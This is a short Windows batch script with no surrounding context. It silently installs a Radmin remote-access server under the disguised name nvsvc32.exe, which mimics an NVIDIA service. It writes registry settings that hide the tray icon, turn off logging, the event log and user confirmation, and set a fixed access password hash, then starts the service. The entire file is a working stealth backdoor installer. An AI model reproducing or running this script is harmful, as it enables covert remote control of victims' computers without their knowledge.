nvsvc32.exe /install /silence
echo off
dtREG -AddKey HKEY_LOCAL_MACHINE\SYSTEM\RAdmin
dtREG -AddKey HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0
dtREG -AddKey HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server
dtREG -AddKey HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters
dtREG -AddKey HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\iplist
dtREG -Set REG_BINARY HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\Port=bb010000
dtREG -Set REG_BINARY HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\Timeout=0a000000
dtREG -Set REG_BINARY HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\EnableLogFile=00000000
dtREG -Set REG_SZ HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\LogFilePath="c:\logfile.txt"
dtREG -Set REG_BINARY HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\FilterIp=00000000
dtREG -Set REG_BINARY HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\DisableTrayIcon=01000000
dtREG -Set REG_BINARY HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\AutoAllow=00000000
dtREG -Set REG_BINARY HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\AskUser=00000000
dtREG -Set REG_BINARY HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\EnableEventLog=00000000
dtREG -Set REG_BINARY HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\Parameter=e572084f0dcc91ac6da0cf4794773a7d
echo off
net start r_server
